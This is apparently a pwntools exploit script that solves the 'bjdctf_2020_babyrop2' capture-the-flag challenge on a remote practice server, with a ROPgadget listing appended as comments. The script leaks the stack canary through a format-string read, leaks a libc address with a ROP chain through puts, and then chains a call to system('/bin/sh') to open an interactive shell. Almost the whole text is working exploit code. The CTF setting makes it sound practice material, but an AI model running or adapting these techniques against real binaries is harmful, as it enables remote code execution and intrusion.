from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./bjdctf_2020_babyrop2")
elf=ELF("./bjdctf_2020_babyrop2")
libc=ELF("./libc-2.23.so")
io=remote("node4.buuoj.cn",26687)

puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
read_got=elf.got[b"read"]
pop_rdi_ret=0x400993


payload=b"%7$p"
io.recvuntil(b"u!\n")
io.sendline(payload)
canary=int(io.recv(18),16)
print("canary  "+hex(canary))

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[b"_start"])
io.recvuntil(b"!\n")
io.sendline(payload)
leak_addr=u64(io.recvuntil(b"\x7f").ljust(8,b"\x00"))
print("leak_addr  "+hex(leak_addr))
base_addr=leak_addr-libc.sym[b"puts"]

sys_addr=base_addr+libc.sym[b"system"]
bin_addr=base_addr+next(libc.search(b"/bin/sh"))

payload=cyclic(0x18)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_addr)
io.recvuntil(b"u!\n")
io.sendline(b"aa")
io.recvuntil(b"!\n")
io.sendline(payload)
io.interactive()





# Gadgets information
# ============================================================
# 0x0000000000400763 : mov byte ptr [rip + 0x20091e], 1 ; ret
# 0x000000000040098c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400990 : pop r14 ; pop r15 ; ret
# 0x0000000000400992 : pop r15 ; ret
# 0x0000000000400762 : pop rbp ; mov byte ptr [rip + 0x20091e], 1 ; ret
# 0x000000000040098b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400700 : pop rbp ; ret
# 0x0000000000400993 : pop rdi ; ret
# 0x0000000000400991 : pop rsi ; pop r15 ; ret
# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005f9 : ret

# Unique gadgets found: 13